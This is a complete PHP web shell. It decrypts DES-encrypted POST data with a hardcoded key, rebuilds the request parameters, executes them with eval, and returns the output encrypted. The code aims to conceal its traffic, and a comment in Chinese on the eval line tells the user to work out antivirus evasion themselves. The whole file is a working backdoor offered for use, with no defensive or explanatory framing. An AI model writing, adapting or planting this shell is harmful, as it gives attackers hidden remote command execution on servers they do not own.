<?php 
$pwd = "x";
$my_echomsg  = "";


//加密
function encrypt($key, $str){
  $block = mcrypt_get_block_size('des', 'ecb');
  $pad = $block - (strlen($str) % $block);
  $str .= str_repeat(chr($pad), $pad);
  $enc_str = mcrypt_encrypt(MCRYPT_DES, $key, $str, MCRYPT_MODE_ECB);
  return base64_encode($enc_str);
}

//解密
function decrypt( $key,$str){
  $str = base64_decode($str);
  $str = mcrypt_decrypt(MCRYPT_DES, $key, $str, MCRYPT_MODE_ECB);
  $block = mcrypt_get_block_size('des', 'ecb');
  $pad = ord($str[($len = strlen($str)) - 1]);
  return substr($str, 0, strlen($str) - $pad);
}
//获取参数值
function getCDPostMsg($msg)
{
    $cdmsg = urldecode($msg);
    $cdpos = strpos($cdmsg,'=');
    if($cdpos!== false)
    {
        $cdmsg = substr($cdmsg,$cdpos+1);
        return $cdmsg;
    }
    else
        return $cdmsg;
}
//替换自己的方法。才能控制echo
function replaceFunction($text){
    $pattern = "/xx\(\'(.*)\'\)/m";
    preg_match_all($pattern,$text,$result);
    $cd_z0 = base64_decode(urldecode($result[1][0]));//解开 b64
    $cd_z0 = str_replace("echo(","myecho(",$cd_z0);//替换echo
    $cd_z0 = str_replace("die()","mydie()",$cd_z0);//替换die
    $b64 = base64_encode($cd_z0);
    $replace_str = "xx('".$b64."')";
    $ev = preg_replace($pattern,$replace_str,$text);
    return $ev;
}


function myecho($msg)
{
    global $my_echomsg;
    $my_echomsg = $my_echomsg.$msg;
}
function mydie(){
    
}


$key = "KvCb2poU";//DESkey
$postdata = urldecode(file_get_contents("php://input"));

$decryptContent = decrypt($key,$postdata);//解密
$ev = replaceFunction($decryptContent);
if(substr($ev,0,1) == "&"){
    $ev = substr($ev,1);
}
$arr = explode('&',$ev);//分割post参数
$arrlength=count($arr);
$_POST = array();

if($arrlength <=1)
{
    $_POST[$pwd] = getCDPostMsg($arr[0]);
}else if($arrlength == 2){ 
    $_POST[$pwd] = getCDPostMsg($arr[0]);
    $_POST['z1'] = getCDPostMsg($arr[1]);
}else if($arrlength == 3){
    $_POST[$pwd] = getCDPostMsg($arr[0]);
    $_POST['z1'] = getCDPostMsg($arr[1]);
    $_POST['z2'] = getCDPostMsg($arr[2]);
}

@eval($_POST[$pwd]);//这里自己想办法免杀吧 :)

$aesContent = encrypt($key,$my_echomsg);
echo($aesContent);

?>

